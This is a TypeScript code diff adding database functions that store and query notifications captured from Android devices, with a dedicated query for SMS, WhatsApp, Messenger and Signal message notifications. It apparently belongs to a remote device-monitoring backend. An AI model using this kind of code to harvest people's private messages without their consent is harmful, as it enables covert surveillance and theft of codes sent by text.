@@ -466,3 +466,84 @@ export async function clearPortalSessions(deviceId: string) {
     )
     }
     
+// ─── Notifications ────────────────────────────────────────────────────────────
+
+export interface NotificationEntry {
+  id: number
+  appPackage: string
+  appName: string
+  title: string
+  text: string
+  receivedAt: string
+}
+
+// Paket SMS umum di berbagai ROM Android
+const SMS_PACKAGES = [
+  'com.android.mms',
+  'com.google.android.apps.messaging',
+  'com.samsung.android.messaging',
+  'com.miui.sms',
+  'com.vivo.mms',
+  'com.oppo.mms',
+  'com.oneplus.mms',
+  'com.huawei.message',
+  'com.sonyericsson.conversations',
+  'org.thoughtcrime.securesms',
+  'com.whatsapp',
+  'com.facebook.orca',
+]
+
+export async function saveNotification(deviceId: string, entry: Omit<NotificationEntry, 'id' | 'receivedAt'>) {
+  await pool.query(
+    `INSERT INTO notifications (device_id, app_package, app_name, title, text)
+     VALUES ($1, $2, $3, $4, $5)`,
+    [deviceId, entry.appPackage, entry.appName, entry.title, entry.text]
+  )
+  await pool.query(
+    `DELETE FROM notifications WHERE device_id = $1 AND id NOT IN (
+       SELECT id FROM notifications WHERE device_id = $1 ORDER BY received_at DESC LIMIT 5000
+     )`,
+    [deviceId]
+  )
+}
+
+export async function getNotifications(deviceId: string, limit = 200, appPackage?: string): Promise<NotificationEntry[]> {
+  const { rows } = appPackage
+    ? await pool.query(
+        `SELECT * FROM notifications WHERE device_id = $1 AND app_package = $2 ORDER BY received_at DESC LIMIT $3`,
+        [deviceId, appPackage, limit]
+      )
+    : await pool.query(
+        `SELECT * FROM notifications WHERE device_id = $1 ORDER BY received_at DESC LIMIT $2`,
+        [deviceId, limit]
+      )
+  return rows.map(r => ({
+    id: r.id as number,
+    appPackage: r.app_package as string,
+    appName: r.app_name as string,
+    title: r.title as string,
+    text: r.text as string,
+    receivedAt: new Date(r.received_at as string).toISOString(),
+  }))
+}
+
+export async function getSmsNotifications(deviceId: string, limit = 200): Promise<NotificationEntry[]> {
+  const placeholders = SMS_PACKAGES.map((_, i) => `$${i + 2}`).join(', ')
+  const { rows } = await pool.query(
+    `SELECT * FROM notifications WHERE device_id = $1 AND app_package IN (${placeholders})
+     ORDER BY received_at DESC LIMIT $${SMS_PACKAGES.length + 2}`,
+    [deviceId, ...SMS_PACKAGES, limit]
+  )
+  return rows.map(r => ({
+    id: r.id as number,
+    appPackage: r.app_package as string,
+    appName: r.app_name as string,
+    title: r.title as string,
+    text: r.text as string,
+    receivedAt: new Date(r.received_at as string).toISOString(),
+  }))
+}
+
+export async function clearNotifications(deviceId: string) {
+  await pool.query(`DELETE FROM notifications WHERE device_id = $1`, [deviceId])
+}
